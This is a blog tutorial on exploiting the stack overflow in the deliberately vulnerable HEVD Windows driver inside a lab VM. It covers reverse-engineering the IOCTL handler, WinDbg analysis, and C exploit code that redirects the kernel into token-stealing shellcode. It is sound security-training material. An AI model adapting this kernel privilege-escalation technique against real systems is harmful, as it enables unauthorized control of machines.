Hi there ✋

This post is the third chapter of this series, where we dive into Windows
kernel. The previous posts introduced respectively how to painlessly setup a
Windows exploit lab, then how to create a custom shellcode for the kernel to
execute.

So now we need vulnerabilities to get control of the program counter (RIP since
we only focus on x64). For that, we'll use the most awesome **Extremely
Vulnerable Driver**.


# Setup

[HackSys Extremely Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) is
a Windows driver for x86 and x64 created by
the HackSys Team (huge props!). Once injected
into Windows, this driver purposely offers several types of vulnerabilities, to
help us practice on them and/or assist us developing new exploitation techniques.


## On the Windows 8.1 x64 debuggee VM

Download and unzip in the Windows 8.1 x64 debuggee VM:

 - [OSR Driver Loader](https://www.osronline.com/article.cfm?article=157)
 - [HackSys Extremely Vulnerable Driver](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/releases/download/v1.20/HEVD.1.20.zip)

Then simply run the `OSR Driver Loader` and register the AMD64 version of
`HEVD.sys`.

{{ img(src="/img/win-kernel-debug/register-hevd.png" title="image_alt") }}

You can then start the service.

But what about the kernel driver signing policy you may ask from Windows Vista
and up? Good point: well in Debug mode, unless
[explicitly stated otherwise via the registry](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/installing-an-unsigned-driver-during-development-and-test#a-href-idenforcing-kernel-mode-signature-verification-in-kernel-debugging-modea-enforcing-kernel-mode-signature-verification-in-kernel-debugging-mode)
the MSDN states that

> Attaching an active kernel debugger to a development or test computer disables
> load-time signature enforcement for kernel-mode drivers.

So we're good here, let's proceed...


## On the Windows debugger VM

The AMD64 directory of HEVD contains the PDB symbols that WinDbg
will use for extra information, so copy this PDB into a `hevd.pdb` directory
located within one of the path defined in the `_NT_SYMBOL_PATH` environment
variable. For example like this (you might need to adjust to your own
configuration):

```bat
C:>  set | find "_NT_SYMBOL_PATH"
_NT_SYMBOL_PATH=SRV*C:\symbols*http://msdl.microsoft.com/download/symbols;
C:> mkdir C:\symbols\hevd.pdb
C:> mkdir C:\syms\hevd.pdb\8F6551A1E31E4F65B536C8DCB40F999B1
C:> xcopy %HOMEPATH%\Desktop\AMD64\*.pdb C:\symbols\hevd.pdb\8F6551A1E31E4F65B536C8DCB40F999B1
```

We can use WinDbg to check that:

  * the HEVD driver is properly loaded:

```txt
kd> lm m HEVD
start             end                 module name
fffff800`c1e39000 fffff800`c1e42000   HEVD       (deferred)
```

  * WinDbg can retrieve its symbols:

```txt
kd> .sympath
Symbol search path is: srv*c:\symbols*http://msdl.microsoft.com/download/symbols

kd> x HEVD!*
fffff800`c1e3c110 HEVD!g_UseAfterFreeObject = 0x00000000`00000000
fffff800`c1e3c108 HEVD!__security_cookie_complement = 0xffff07ff`3e1c34a0
fffff800`c1e3b368 HEVD!$xdatasym = 0x01 ''
fffff800`c1e3b388 HEVD!$xdatasym = 0x01 ''
fffff800`c1e3c000 HEVD!HotPatchBuffer = struct _PATCH_BUFFER
[...]
```

Last, you may overwrite the `nt!Kd_Default_Mask` to increase/decrease Windows kernel
verbosity from WinDbg

```txt
kd> ed nt!Kd_Default_Mask 0xf
```

However, my preferred approach is to edit the registry on the debuggee to always
print debug info. This can be done via the key
`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter` in an
Admin command prompt:

```bat
C:> reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Debug Print Filter" /v DEFAULT /t REG_DWORD /d 0xf
```

**Quick tip**: use `kd` command `!dbgprint` to navigate through the DbgPrint buffer.

We're ready dive in!


# Reverse-Engineering HEVD.sys

Although the
[source code](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/tree/master/Driver) of
the entire driver is freely accessible, going black-box reversing (i.e. without
any source code) is a good practice for real-life bug hunting. Moreover, the
driver is well written, no obfuscation/packing in place, and the symbols
are provided, to greatly improve the reversing process.

## Hunting the vulnerability

### Talking to the HEVD driver

Any Windows driver must  define an entry point by which Windows can load
it. This is done with
the
[DriverEntry](https://msdn.microsoft.com/en-us/library/windows/hardware/ff544113(v=vs.85).aspx)
routine whose signature is as follow:

```c
NTSTATUS DriverEntry(
  _In_ struct _DRIVER_OBJECT *DriverObject,
  _In_ PUNICODE_STRING       RegistryPath
)
```

WinDbg confirms that immediately:

```txt
kd> x HEVD!DriverEntry
fffff800`c1e41008 HEVD!DriverEntry (struct _DRIVER_OBJECT *, struct _UNICODE_STRING *)
```

By checking this function in IDA Pro, we spot immediately that the driver
creates a device called `\Device\HackSysExtremeVulnerableDriver` via the
routine
[`IoCreateDevice`](https://msdn.microsoft.com/en-us/library/windows/hardware/ff548397(v=vs.85).aspx),
with a `DeviceType` set
as
[`FILE_DEVICE_UNKNOWN`](https://docs.microsoft.com/en-us/windows-hardware/drivers/kernel/specifying-device-types) -
or 0x22.

{{ img(src="/img/win-kernel-debug/hevd-stack-overflow-ida-driver-entry.png" title="DriverEntry in IDA") }}

Then the `DriverObject` gets populated with the [structure members](https://msdn.microsoft.com/en-us/library/windows/hardware/ff544174(v=vs.85).aspx) including functions
pointers, among which we find the IOCTL
handler, `IrpDeviceIoCtlHandler`. This function
dispatches [IOCTL](https://en.wikipedia.org/wiki/Ioctl) requests done
from user-land to the HEVD driver. Every IOCTL is uniquely identified by a specific code, and the handler will basically do a big `switch(dwIoControlCode){...}` to execute the corresponding code. IDA is capable of pulling out for us:

{{ img(src="/img/win-kernel-debug/hevd-stack-overflow-ida-ioctl-1.png" title="image_alt") }}

In this first exploitation, we want to reach the `StackOverflowIoctlHandler`, and
therefore need to send a
[`DeviceIoControl()`](https://msdn.microsoft.com/en-us/library/windows/desktop/aa363216(v=vs.85).aspx) request with a code set to 0x222003.

__Note__: for this initial post, we'll focus on the stack overflow vulnerability, but future posts may
cover the other vulnerabilities in the HEVD driver, for which we'll only need to change the `dwIoControlCode` value in order to reach them.

So we know how to reach the driver and the targeted function, which would look
like (in pseudo-C):

```c

#define IOCTL_HEVD_STACK_OVERFLOW 0x222003


HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", ...);
BOOL bResult = DeviceIoControl(hDevice, IOCTL_HEVD_STACK_OVERFLOW,
                               lpBufferIn, dwBufferInLength, ...);
```


### Analyzing the vulnerability

We know how to reach `StackOverflowIoctlHandler()` from user-land, and pass in an
controlled buffer of an arbitrary size. Here is the `TriggerStackOverflow` function translated to pseudo-C:

```c
int TriggerStackOverflow(void *UserBuffer, uint64_t Size)
{
  char Dst[2048];
  ZeroMemory(Dst, 0x800);
  ProbeForRead(UserBuffer, 0x800, 4);
  DbgPrint_0("[+] UserBuffer: 0x%p\n", UserBuffer);
  DbgPrint_0("[+] UserBuffer Size: 0x%X\n", Size);
  DbgPrint_0("[+] KernelBuffer: 0x%p\n", &Dst);
  DbgPrint_0("[+] KernelBuffer Size: 0x%X\n", 0x800);
  DbgPrint_0("[+] Triggering Stack Overflow\n");
  RtlCopyMemory(Dst, UserBuffer, Size);
  return 0;
}
```

The code leaves no room for ambiguity about the vulnerability: we can overflow
the kernel stack by passing in a buffer of length > 0x800 bytes. Since the
buffer is read directly from user-land
([`ProbeForRead`](https://msdn.microsoft.com/en-us/library/windows/hardware/ff559876(v=vs.85).aspx))
we have full control over it, which simplifies greatly the exploitation.

So the exploit code looks clearer:


```c

#define IOCTL_HEVD_STACK_OVERFLOW 0x222003


HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", ...);

LPVOID lpInBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
DWORD nInBufferSize = 0x800 + 0x50;
ZeroMemory(lpInBuffer, 0x1000);
RtlFillMemory(lpInBuffer, 0x1000, 'A'); // for now, let's just populate the stack with 'A'


BOOL bResult = DeviceIoControl(hDevice, IOCTL_HEVD_STACK_OVERFLOW,
                               lpBufferIn, dwBufferInLength, ...);
```

And move on to the dynamic analysis...

# Dynamic analysis

Assuming [SMEP](https://en.wikipedia.org/wiki/Supervisor_Mode_Access_Prevention)
is not enabled, once we control the program counter, we can
simply return to an known executable location in user-land, location that'll
hold
[the shellcode we created in the last post](/2017/08/14/a-primer-to-windows-x64-shellcoding). But
to know the state of the stack after the overflow but before exiting the function, it'd
be nice to have WinDbg break at the `ret` instruction of
`TriggerStackOverflow`. Since ASLR is enabled, we can't just break at a fixed
address and having to compute the address would be tedious, but fortunately,
WinDbg, in its all awesomeness,
provides the command "Break Unresolved" (`bu`) which provides a clean way to circumvent this issue:

```txt
kd> uf HEVD!TriggerStackOverflow
[...]
  101 fffff801`8063e707 5f              pop     rdi
  101 fffff801`8063e708 c3              ret

kd> ? fffff801`8063e708 - HEVD!TriggerStackOverflow
Evaluate expression: 200 = 00000000`000000c8

kd> bu HEVD!TriggerStackOverflow+c8
```

We can now compile and run our first PoC, and wait for WinDbg to catch the breakpoint.

{{ img(src="/img/win-kernel-debug/hevd-stack-overflow-windbg-ret.png" title="image_alt") }}

If we check the stack, we see that we've successfully overwritten the return
address:

```txt
          |                |
          |    ReturnAddr  |
          |       SFP      |
          | AAAAAAAAAAAAAA |
          | AAAAAAAAAAAAAA |
          | AAAAAAAAAAAAAA |
          | AAAAAAAAAAAAAA |
          | AAAAAAAAAAAAAA |
          | AAAAAAAAAAAAAA |
          |                |
```

So we know that our user-land allocated must be something like:

```txt
                     0x800 bytes             8 bytes    8 bytes
 _____________________^___________________   ___^____   ___^____
/                                         \ /        \ /        \
|                                          |          |          |
| Shellcode + Padding                      | BBBBBBBB | addr. of |
|                                          |          |  buffer  |
^                                                          |
|                                                          |
\__________________________________________________________/
```

Which translates into the following C code:

```c
#define IOCTL_HEVD_STACK_OVERFLOW 0x222003


/* 1. Get a handle to the driver */
HANDLE hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", ...);

/* 2. Populate our controlled area */
LPVOID lpInBuffer = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
DWORD nInBufferSize = 0x800 + 0x50;
ZeroMemory(lpInBuffer, 0x1000);
CopyMemory(lpInBuffer, StealTokenShellcode, StealTokenShellcodeLength);
RtlFillMemory(lpInBuffer+StealTokenShellcodeLength, 0x1000-StealTokenShellcodeLength, '\xcc');
uint64_t *ptr = (uint64_t*) (lpInBuffer + 0x808);
*ptr = (uint64_t)lpInBuffer;

/* 3. Send the IOCTL request */
BOOL bResult = DeviceIoControl(hDevice, IOCTL_HEVD_STACK_OVERFLOW,
                               lpBufferIn, dwBufferInLength, ...);

/* 4. Profit */
```


# Final wrap-up

The final exploit can be found [here](https://github.com/hugsy/hevd/blob/feb6d67ca5f5f3c0718042b42e22adbeee6aee62/StackOverflow/exploit.c). It includes a few extra logging information and nice cleanup so the executable can be reused many times.

```bash
$ x86_64-w64-mingw32-gcc -D__WIN81__ -D__X86_64__ -o exploit.exe exploit.c
```

The PE `exploit.exe` provided was compiled with the exploitation offsets of
the internal structures of Windows 8.1 x86. Reusing directly the PE on another
version of Windows might produce an unexpected behavior.

We can run it, and w00t !

{{ img(src="/img/win-kernel-debug/hevd-stack-overflow-exploit.png" title="image_alt") }}

I've also added to the repository my WinDbg workspaces (for both user-mode and
kernel-mode) along with a header file `hevd.h` with a few functions helping the
exploit process of this awesome vulnerable driver.

Until next time, ✌
